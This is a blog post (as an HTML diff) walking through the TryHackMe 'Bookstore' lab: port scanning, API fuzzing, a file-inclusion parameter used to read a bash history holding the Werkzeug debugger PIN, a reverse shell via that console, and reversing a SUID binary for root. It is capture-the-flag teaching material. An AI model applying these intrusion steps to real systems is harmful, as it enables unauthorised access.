@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  
+<title>TryHackMe Bookstore | Zane&#x27;s Notes</title>
+
+
+
+<meta property="og:title" content="TryHackMe Bookstore">
+
+
+
+<meta name="author" content="Zane Fry">
+
+
+<meta property="og:locale" content="en_US">
+
+
+<meta name="description" content="Notes on infosec">
+<meta property="og:description" content="Notes on infosec">
+
+
+
+<link rel="canonical" href="https://zanefry.github.io/challenges/bookstore/">
+<meta property="og:url" content="https://zanefry.github.io/challenges/bookstore/">
+
+
+
+<meta property="og:site_name" content="Zane&#x27;s Notes" />
+
+
+
+  <meta property="og:image" content="https://zanefry.github.io/tale.png">
+  
+  
+
+
+
+  <meta property="og:type" content="article" />
+  <meta property="article:published_time" content="2022-11-07T18:49:59-06:00">
+
+
+
+
+
+
+
+  <meta name="twitter:card" content="summary_large_image"">
+  <meta property="twitter:image" content="https://zanefry.github.io/tale.png">
+
+
+
+  <meta property="twitter:title" content="TryHackMe Bookstore">
+
+
+
+
+
+  
+
+  
+
+  
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+<script type="application/ld+json">
+{
+  "author": {
+    "@type":"Person",
+	  "name":"Zane Fry",
+  },
+  "description": "Notes on infosec",
+  "url": "https://zanefry.github.io/challenges/bookstore/",
+  "@context":"https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "TryHackMe Bookstore"
+  
+    
+    
+      "datePublished":"2022-11-07T18:49:59-06:00",
+    
+    "mainEntityOfPage":{
+      "@type":"WebPage",
+      "@id":"https://zanefry.github.io/challenges/bookstore/"
+    },
+  
+}
+</script>
+
+  <link rel="stylesheet" href="https://zanefry.github.io/main.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+
+  <link rel="icon" type="image/png" sizes="32x32" href="https://zanefry.github.io/assets/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://zanefry.github.io/assets/favicon-16x16.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://zanefry.github.io/assets/apple-touch-icon.png">
+
+  
+    <link type="application/atom+xml" rel="alternate" href="https://zanefry.github.io/atom.xml" title="Zane&#x27;s Notes" />
+  
+
+  
+
+  
+  
+	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css"
+	integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">
+	<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"
+	integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
+	<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"
+	integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
+	onload="renderMathInElement(document.body);"></script>
+
+</head>
+
+<body>
+  
+  <nav class="nav">
+    <div class="nav-container">
+      <a href="https://zanefry.github.io">
+        <h2 class="nav-title">Zane&#x27;s Notes</h2>
+      </a>
+      <ul>
+        
+          
+            <li><a href="https://zanefry.github.io/blog">Blog</a></li>
+          
+            <li><a href="https://zanefry.github.io/challenges">Challenges</a></li>
+          
+            <li><a href="https://zanefry.github.io/tags">Tags</a></li>
+          
+            <li><a href="https://zanefry.github.io/about">About</a></li>
+          
+        
+      </ul>
+    </div>
+  </nav>
+  
+
+  <main>
+    
+  <div class="post">
+  	<div class="post-info">
+  		<span>Written by</span> Zane Fry<br>
+  		
+  		<span>on&nbsp;</span><time datetime="2022-11-07T18:49:59-06:00">November  7, 2022</time>
+  	</div>
+  	<h1 class="post-title">TryHackMe Bookstore</h1>
+  	<div class="post-line"></div>
+  	<p><strong>Room Description:</strong></p>
+<blockquote>
+<p>A Beginner level box with basic web enumeration and REST API Fuzzing.</p>
+</blockquote>
+<span id="continue-reading"></span>
+<p>Let's start with a quick port scan.</p>
+<pre data-lang="bash" style="background-color:#191919;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#e9fdac;">nmap</span><span style="font-style:italic;color:#fc9354;"> -sC -sV</span><span> bookstore.thm
+</span></code></pre>
+<pre style="background-color:#191919;color:#f8f8f2;"><code><span>PORT     STATE SERVICE VERSION
+</span><span>22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span><span>| ssh-hostkey:
+</span><span>|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
+</span><span>|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
+</span><span>|_  256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
+</span><span>80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+</span><span>|_http-server-header: Apache/2.4.29 (Ubuntu)
+</span><span>|_http-title: Book Store
+</span><span>5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
+</span><span>| http-robots.txt: 1 disallowed entry
+</span><span>|_/api &lt;/p&gt;
+</span><span>|_http-title: Home
+</span><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></code></pre>
+<p>It's hosting two http servers, and the one on port 5000 has one entry
+in its <code>/robots.txt</code>. Probably a REST API as the room description suggests. I also
+went on to scan all ports to no avail.</p>
+<hr />
+<h2 id="port-80"><a class="zola-anchor" href="#port-80" aria-label="Anchor link for: port-80">🔗</a>Port 80</h2>
+<p>The site on port 80 is mostly empty with a few forms that aren't connected to anything,
+but after a little searching I found an interesting comment in <code>/login.html</code>.</p>
+<pre data-lang="bash" style="background-color:#191919;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#e9fdac;">curl</span><span style="font-style:italic;color:#fc9354;"> -s</span><span> bookstore.thm/login.html </span><span style="color:#ff5e5e;">| </span><span style="color:#e9fdac;">grep </span><span style="color:#ffffff;">&#39;</span><span style="color:#fbe3bf;">&lt;!--</span><span style="color:#ffffff;">&#39;
+</span></code></pre>
+<pre style="background-color:#191919;color:#f8f8f2;"><code><span>...
+</span><span>&lt;!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid&#39;s bash history file --&gt;
+</span></code></pre>
+<p>I'm not sure what's mean by the debugger pin yet, but we have a username: <strong>sid</strong>.</p>
+<hr />
+<h2 id="port-5000"><a class="zola-anchor" href="#port-5000" aria-label="Anchor link for: port-5000">🔗</a>Port 5000</h2>
+<p>Nothing on the home page, let's try directory enumeration.</p>
+<pre data-lang="bash" style="background-color:#191919;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#e9fdac;">curl</span><span style="font-style:italic;color:#fc9354;"> -s</span><span> bookstore.thm:5000
+</span></code></pre>
+<pre style="background-color:#191919;color:#f8f8f2;"><code><span>&lt;title&gt;Home&lt;/title&gt;
+</span><span>&lt;h1&gt;Foxy REST API v2.0&lt;/h1&gt;
+</span><span>&lt;p&gt;This is a REST API for science fiction novels.&lt;/p&gt;
+</span></code></pre>
+<pre data-lang="bash" style="background-color:#191919;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#e9fdac;">ffuf</span><span style="font-style:italic;color:#fc9354;"> -u</span><span> bookstore.thm:5000/FUZZ</span><span style="font-style:italic;color:#fc9354;"> -w </span><span style="color:#ffffff;">$</span><span>(</span><span style="color:#e9fdac;">locate</span><span style="font-style:italic;color:#fc9354;"> -r</span><span> /common.txt)
+</span></code></pre>
+<pre style="background-color:#191919;color:#f8f8f2;"><code><span>    /&#39;___\  /&#39;___\           /&#39;___\
+</span><span>   /\ \__/ /\ \__/  __  __  /\ \__/
+</span><span>   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+</span><span>    \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+</span><span>     \ \_\   \ \_\  \ \____/  \ \_\
+</span><span>      \/_/    \/_/   \/___/    \/_/
+</span><span>
+</span><span>v1.1.0
+</span><span>________________________________________________
+</span><span>
+</span><span>:: Method           : GET
+</span><span>:: URL              : http://bookstore.thm:5000/FUZZ
+</span><span>:: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/common.txt
+</span><span>:: Follow redirects : false
+</span><span>:: Calibration      : false
+</span><span>:: Timeout          : 10
+</span><span>:: Threads          : 40
+</span><span>:: Matcher          : Response status: 200,204,301,302,307,401,403
+</span><span>________________________________________________
+</span><span>
+</span><span>api                     [Status: 200, Size: 825, Words: 82, Lines: 12]
+</span><span>console                 [Status: 200, Size: 1985, Words: 411, Lines: 53]
+</span><span>robots.txt              [Status: 200, Size: 45, Words: 5, Lines: 2]
+</span><span>:: Progress: [4713/4713] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
+</span></code></pre>
+<p>Navigating to <code>/console</code> prompts us for a pin. Werkzeug must be a web console
+for debugging that was left in production in this fictional scenario. Maybe the
+REST API is vulnerable to LFI and we can read <strong>sid</strong>'s <code>.bash_history</code> file.</p>
+<img src="console_locked.png" height=350/>
+<p>Navigating to <code>/api</code> shows documentation of an endpoint called <code>books</code>.</p>
+<pre data-lang="bash" style="background-color:#191919;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#e9fdac;">curl</span><span style="font-style:italic;color:#fc9354;"> -s</span><span> bookstore.thm:5000/api </span><span style="color:#ff5e5e;">| </span><span style="color:#e9fdac;">html2text
+</span></code></pre>
+<pre style="background-color:#191919;color:#f8f8f2;"><code><span>****** API Documentation ******
+</span><span>**** Since every good API has a documentation we have one as well! ****
+</span><span>***** The various routes this API currently provides are: *****
+</span><span>
+</span><span>/api/v2/resources/books/all (Retrieve all books and get the output in a json format)
+</span><span>/api/v2/resources/books/random4 (Retrieve 4 random records)
+</span><span>/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)
+</span><span>/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)
+</span><span>/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)
+</span><span>/api/v2/resources/books?author=J.K. Rowling&amp;published=2003 (Search by a combination of 2 or more parameters)
+</span></code></pre>
+<p>After a bunch of fuzzing and trying <code>sqlmap</code> with no results I thought to try changing <code>v2</code> to <code>v1</code>.</p>
+<pre data-lang="bash" style="background-color:#191919;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#e9fdac;">curl</span><span style="font-style:italic;color:#fc9354;"> -I</span><span> bookstore.thm:5000/api/v1/resources/books</span><span style="color:#ff5e5e;">?</span><span>id=1
+</span></code></pre>
+<pre style="background-color:#191919;color:#f8f8f2;"><code><span>HTTP/1.0 200 OK
+</span><span>Content-Type: application/json
+</span><span>Access-Control-Allow-Origin: *
+</span><span>Content-Length: 237
+</span><span>Server: Werkzeug/0.14.1 Python/3.6.9
+</span><span>Date: Tue, 08 Nov 2022 21:22:52 GMT
+</span></code></pre>
+<p>Looks like version 1 is still up. Let's try fuzzing for parameters that aren't listed in the documentation.</p>
+<pre data-lang="bash" style="background-color:#191919;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#e9fdac;">ffuf</span><span style="font-style:italic;color:#fc9354;"> -u </span><span style="color:#ffffff;">&#39;</span><span style="color:#fbe3bf;">http://bookstore.thm:5000/api/v1/resources/books?FUZZ=/etc/passwd</span><span style="color:#ffffff;">&#39;</span><span style="font-style:italic;color:#fc9354;"> -w </span><span style="color:#ffffff;">$</span><span>(</span><span style="color:#e9fdac;">locate</span><span> actions-lowercase)
+</span></code></pre>
+<pre style="background-color:#191919;color:#f8f8f2;"><code><span>        /&#39;___\  /&#39;___\           /&#39;___\
+</span><span>       /\ \__/ /\ \__/  __  __  /\ \__/
+</span><span>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+</span><span>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+</span><span>         \ \_\   \ \_\  \ \____/  \ \_\
+</span><span>          \/_/    \/_/   \/___/    \/_/
+</span><span>
+</span><span>v1.1.0
+</span><span>________________________________________________
+</span><span>
+</span><span>:: Method           : GET
+</span><span>:: URL              : http://bookstore.thm:5000/api/v1/resources/books?FUZZ=/etc/passwd
+</span><span>:: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/api/actions-lowercase.txt
+</span><span>:: Follow redirects : false
+</span><span>:: Calibration      : false
+</span><span>:: Timeout          : 10
+</span><span>:: Threads          : 40
+</span><span>:: Matcher          : Response status: 200,204,301,302,307,401,403
+</span><span>________________________________________________
+</span><span>
+</span><span>show                    [Status: 200, Size: 1555, Words: 9, Lines: 31]
+</span><span>:: Progress: [109/109] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::&#39;
+</span></code></pre>
+<p>Finally a vulnerable parameter, and upon further inspection it turns out to be the LFI foreshadowed by the comment in <code>/login.html</code>.</p>
+<pre data-lang="bash" style="background-color:#191919;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#e9fdac;">curl</span><span style="font-style:italic;color:#fc9354;"> -s </span><span style="color:#ffffff;">&#39;</span><span style="color:#fbe3bf;">http://bookstore.thm:5000/api/v1/resources/books?show=/home/sid/.bash_history</span><span style="color:#ffffff;">&#39;
+</span></code></pre>
+<pre style="background-color:#191919;color:#f8f8f2;"><code><span>whoami
+</span><span>export WERKZEUG_DEBUG_PIN=123-321-135
+</span><span>echo $WERKZEUG_DEBUG_PIN
+</span><span>python3 /home/sid/api.py
+</span><span>ls
+</span><span>exit
+</span></code></pre>
+<p>With access to the python console we can simply paste some code from <a href="https://revshells.com">revshells.com</a> and get a shell.</p>
+<img src="console_revshell.png" height=350/>
+<hr />
+<h2 id="local-privilege-escalation"><a class="zola-anchor" href="#local-privilege-escalation" aria-label="Anchor link for: local-privilege-escalation">🔗</a>Local Privilege Escalation</h2>
+<p>In <strong>sid</strong>'s home dir there's a SUID binary owned by root. This must be the intended path for privilege escalation.</p>
+<pre style="background-color:#191919;color:#f8f8f2;"><code><span>sid@bookstore:~$ ls -l
+</span><span>total 44
+</span><span>-r--r--r-- 1 sid  sid  4635 Oct 20  2020 api.py
+</span><span>-r-xr-xr-x 1 sid  sid   160 Oct 14  2020 api-up.sh
+</span><span>-rw-rw-r-- 1 sid  sid 16384 Oct 19  2020 books.db
+</span><span>-rwsrwsr-x 1 root sid  8488 Oct 20  2020 try-harder
+</span><span>-r--r----- 1 sid  sid    33 Oct 15  2020 user.txt
+</span></code></pre>
+<p>What does it do?</p>
+<pre style="background-color:#191919;color:#f8f8f2;"><code><span>sid@bookstore:~$ ./try-harder
+</span><span>What&#39;s The Magic Number?!
+</span><span>1337
+</span><span>Incorrect Try Harder
+</span></code></pre>
+<p>Seems like a reverse engineering challenge. I tried <code>strings</code>, <code>ltrace</code>, and <code>strace</code> before copying it to my machine,
+dropping it into IDA, and generating some C pseudocode.</p>
+<img src="ida_screenshot.png" height=300 style="margin-bottom: 20px"/>
+<p>The germane part is this:</p>
+<pre data-lang="C" style="background-color:#191919;color:#f8f8f2;" class="language-C "><code class="language-C" data-lang="C"><span>v6 </span><span style="color:#ff5e5e;">= </span><span style="color:#fdb082;">23987</span><span>;
+</span><span style="color:#e9fdac;">scanf</span><span>(</span><span style="color:#ffffff;">&quot;</span><span style="color:#fdb082;">%d</span><span style="color:#ffffff;">&quot;</span><span>, </span><span style="color:#ff5e5e;">&amp;</span><span>v5);
+</span><span>v7 </span><span style="color:#ff5e5e;">=</span><span> v6 </span><span style="color:#ff5e5e;">^</span><span> v5 </span><span style="color:#ff5e5e;">^ </span><span style="color:#fdb082;">0x1116</span><span>;
+</span><span style="color:#ff5e5e;">if </span><span>(v7 </span><span style="color:#ff5e5e;">== </span><span style="color:#fdb082;">1573724660</span><span>)
+</span><span>    </span><span style="color:#e9fdac;">system</span><span>(</span><span style="color:#ffffff;">&quot;</span><span style="color:#fbe3bf;">/bin/bash -p</span><span style="color:#ffffff;">&quot;</span><span>);
+</span></code></pre>
+<p>The <code>^</code> symbol denotes the <abbr title="Exclusive OR"><em>XOR</em></abbr> operation, which is easiest to explain visually to those unfamiliar:</p>
+<pre style="background-color:#191919;color:#f8f8f2;"><code><span>     1010110
+</span><span> XOR 1101111
+</span><span> -----------
+</span><span>     0111001
+</span></code></pre>
+<p>The result is <code>0</code> where the operands agree and <code>1</code> where they differ.
+If we assert <code>v7</code> is equal to the correct value to give us a root shell,
+and convert all numbers to hex, the xor expression can be rearranged to
+<code>0x1116 ^ 0x5db3 ^ 0x5dcd21f4 = v5</code>. The reason <code>v5</code> can be isolated this way
+is that xor is its own inverse. Then all that's left to find the correct input
+is to compute the xor of these three terms.</p>
+<pre data-lang="bash" style="background-color:#191919;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#e9fdac;">python</span><span style="font-style:italic;color:#fc9354;"> -c </span><span style="color:#ffffff;">&#39;</span><span style="color:#fbe3bf;">print(int(0x1116) ^ int(0x5db3) ^ int(0x5dcd21f4))</span><span style="color:#ffffff;">&#39;
+</span></code></pre>
+<pre style="background-color:#191919;color:#f8f8f2;"><code><span>1573743953
+</span></code></pre>
+<p>Let's try it.</p>
+<pre style="background-color:#191919;color:#f8f8f2;"><code><span>sid@bookstore:~$ ./try-harder
+</span><span>What&#39;s The Magic Number?!
+</span><span>1573743953
+</span><span>root@bookstore:~#
+</span></code></pre>
+<p>And there we have it. This room was good practice for learning to persist when fuzzing. I especially liked the step which required
+going from <code>v2</code> to <code>v1</code>.</p>
+
+  </div>
+
+	
+
+  <div class="pagination">
+  	
+		<a href="#" class="top">Top</a>
+		
+  </div>
+
+  </main>
+
+  
+  <footer>
+    <span>&copy; <time datetime="2022-12-09T00:47:11.891473710+00:00">2022</time> Zane Fry. Made with <a href="https://www.getzola.org">Zola</a> and <a href="https://github.com/aaranxu/tale-zola">Tale-Zola</a>.</span>
+  </footer>
+  
+</body>
+</html>
